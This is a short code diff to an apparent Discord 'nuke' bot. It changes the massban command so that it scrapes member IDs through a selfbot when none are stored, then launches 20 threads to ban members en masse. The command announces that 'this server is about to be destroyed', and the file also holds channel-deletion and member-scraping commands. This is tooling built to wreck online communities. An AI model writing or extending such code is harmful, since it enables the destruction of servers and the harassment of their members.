@@ -63,6 +63,12 @@ async def on_ready():
 @client.command(pass_context=True)
 async def massban(ctx: commands.Context):
     await ctx.reply(content="Ok this server is about to be destroyed")
+    with open('ids.json') as fp:
+        data = json.load(fp)
+    if len(data) == 0:
+        print(f"[>] Members not scraped")
+        selfbot.scrape(str(ctx.guild.id), str(ctx.channel.id)) # scrapes members if u have not already scrapped
+        await ctx.send(content="Scrapped members")
     threads = []
     for i in range(20):
         t = threading.Thread(target=massBan, args=(ctx.guild.id, ), daemon=True)
@@ -128,7 +134,6 @@ async def deleteallchannels(ctx: commands.Context):
 
 @client.command(pass_context=True)
 async def scrape(ctx: commands.Context):
-    embed = discord.Embed(color=000)
     await ctx.reply(content="Scrapping Members From Server")
     selfbot.scrape(str(ctx.guild.id), str(ctx.channel.id))
 
